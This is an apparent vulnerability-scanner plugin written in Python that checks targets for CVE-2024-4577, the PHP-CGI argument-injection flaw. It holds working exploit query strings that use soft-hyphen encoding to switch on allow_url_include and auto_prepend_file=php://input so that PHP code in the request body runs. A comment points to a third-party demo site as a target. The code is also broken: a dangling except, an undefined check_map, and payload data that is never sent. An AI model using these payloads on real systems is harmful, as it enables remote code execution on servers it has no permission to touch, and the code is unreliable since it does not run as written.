from sys import exception
from urllib import response

from flask import request
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType


# 官方演示站点 http://www.any800.com/


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "发现 CVE-2024-4577"
        self.app_name = 'CVE-2024-4577'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        
        payloads = ['/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
        '/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input']
        
        php_code = '<?php echo "Oyst3r"; ?>'
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        for payload in payloads:
            url = target + payload
            try:
                response = http_req(url)
            except


        for path in check_map:
            url = target + path
            conn = http_req(url)
            if check_map[path] in conn.content:
                self.logger.success("found {} {}".format(self.app_name, url))
                return url
